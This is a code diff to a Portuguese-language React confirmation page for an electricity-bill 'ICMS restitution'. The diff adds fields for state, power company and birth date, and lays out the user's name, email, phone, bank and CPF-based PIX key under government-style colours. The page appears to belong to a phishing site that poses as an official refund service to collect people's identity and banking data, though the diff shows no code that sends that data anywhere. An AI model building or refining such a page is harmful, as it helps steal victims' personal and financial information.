@@ -112,13 +112,24 @@ export default function Confirmacao() {
 
   const { toast } = useToast();
 
+  // Estado e companhia
+  const [estadoUsuario, setEstadoUsuario] = useState("");
+  const [companhiaEletrica, setCompanhiaEletrica] = useState("");
+  const [dataNascimento, setDataNascimento] = useState("");
+
   // Extrair parâmetros da URL
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const nome = params.get("nome") || "";
     const valor = params.get("valor") || "0";
+    const estado = params.get("estado") || "";
+    const companhia = params.get("companhia") || "";
+    const nasc = params.get("nasc") || "";
     
     setNomeUsuario(nome.split(" ")[0]);
+    setEstadoUsuario(estado);
+    setCompanhiaEletrica(companhia);
+    setDataNascimento(nasc);
     
     // Formatar o valor para exibição
     const valorNumerico = parseFloat(valor);
@@ -409,53 +420,93 @@ export default function Confirmacao() {
       case "confirmacao":
         return (
           <div className={`${classeAnimacao} space-y-6`}>
-            <div className="bg-gradient-to-r from-green-50 to-blue-50 border border-blue-100 rounded-lg p-6 shadow-sm">
+            <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
               <h3 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4 flex items-center">
                 <CircleDollarSign className="h-5 w-5 mr-2 text-green-500" />
                 Resumo da Solicitação
               </h3>
-              <div className="space-y-3">
-                <div className="flex justify-between items-center py-2 border-b border-blue-100">
-                  <span className="text-[var(--gov-gray-dark)]">Email:</span>
-                  <span className="font-medium text-[var(--gov-blue-dark)]">{emailConfirmado}</span>
+              
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
+                  <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                    Dados Pessoais
+                  </h4>
+                  <div className="space-y-2">
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Nome:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{nomeUsuario}</span>
+                    </div>
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{dataNascimento}</span>
+                    </div>
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Email:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{emailConfirmado}</span>
+                    </div>
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Telefone:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{formatarTelefone(telefoneConfirmado)}</span>
+                    </div>
+                  </div>
                 </div>
-                <div className="flex justify-between items-center py-2 border-b border-blue-100">
-                  <span className="text-[var(--gov-gray-dark)]">Telefone:</span>
-                  <span className="font-medium text-[var(--gov-blue-dark)]">{formatarTelefone(telefoneConfirmado)}</span>
-                </div>
-                <div className="flex justify-between items-center py-2 border-b border-blue-100">
-                  <span className="text-[var(--gov-gray-dark)]">Banco:</span>
-                  <span className="font-medium text-[var(--gov-blue-dark)]">{bancoSelecionado}</span>
-                </div>
-                <div className="flex justify-between items-center py-2 border-b border-blue-100">
-                  <span className="text-[var(--gov-gray-dark)]">Chave PIX:</span>
-                  <span className="font-medium text-[var(--gov-blue-dark)]">{formatarCPF(chavePix)}</span>
-                </div>
-                <div className="flex justify-between items-center py-2">
-                  <span className="text-[var(--gov-gray-dark)]">Valor a receber:</span>
-                  <span className="font-bold text-xl text-green-600">{valorRestituicao}</span>
+                
+                <div className="bg-green-50 p-4 rounded-lg border border-green-100">
+                  <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                    Dados da Conta de Luz
+                  </h4>
+                  <div className="space-y-2">
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Estado:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{estadoUsuario}</span>
+                    </div>
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Companhia:</span>
+                      <span className="font-medium text-[var(--gov-blue-dark)]">{companhiaEletrica}</span>
+                    </div>
+                    <div className="flex justify-between items-center text-sm">
+                      <span className="text-[var(--gov-gray-dark)]">Valor a Receber:</span>
+                      <span className="font-bold text-green-600">{valorRestituicao}</span>
+                    </div>
+                  </div>
                 </div>
               </div>
-            </div>
-            
-            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
-              <div className="flex items-start">
-                <AlertCircle className="h-5 w-5 text-yellow-500 mt-0.5 mr-2 flex-shrink-0" />
-                <p className="text-sm text-yellow-700">
-                  Ao confirmar, você declara que as informações fornecidas são verdadeiras e concorda
-                  com os termos do processo de restituição do ICMS cobrado indevidamente.
-                </p>
+              
+              <div className="bg-amber-50 p-4 rounded-lg border border-amber-100 mb-4">
+                <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                  Dados Bancários
+                </h4>
+                <div className="space-y-2">
+                  <div className="flex justify-between items-center text-sm">
+                    <span className="text-[var(--gov-gray-dark)]">Banco:</span>
+                    <span className="font-medium text-[var(--gov-blue-dark)]">{bancoSelecionado}</span>
+                  </div>
+                  <div className="flex justify-between items-center text-sm">
+                    <span className="text-[var(--gov-gray-dark)]">Chave PIX (CPF):</span>
+                    <span className="font-medium text-[var(--gov-blue-dark)]">{formatarCPF(chavePix)}</span>
+                  </div>
+                </div>
               </div>
-            </div>
-            
-            <div className="flex justify-center mt-8">
-              <Button 
-                onClick={finalizarProcesso}
-                className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold py-6 px-8 text-lg rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
-              >
-                <CheckCircle2 className="mr-2 h-5 w-5" />
-                Confirmar e Finalizar
-              </Button>
+              
+              <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-r-lg mb-6">
+                <div className="flex items-start">
+                  <AlertCircle className="h-5 w-5 text-yellow-500 mt-0.5 mr-2 flex-shrink-0" />
+                  <p className="text-sm text-yellow-700">
+                    Ao confirmar, você declara que as informações fornecidas são verdadeiras e concorda
+                    com os termos do processo de restituição do ICMS cobrado indevidamente.
+                  </p>
+                </div>
+              </div>
+              
+              <div className="flex justify-center mt-6">
+                <Button 
+                  onClick={finalizarProcesso}
+                  className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold py-6 px-8 text-lg rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
+                >
+                  <CheckCircle2 className="mr-2 h-5 w-5" />
+                  Confirmar e Finalizar
+                </Button>
+              </div>
             </div>
           </div>
         );
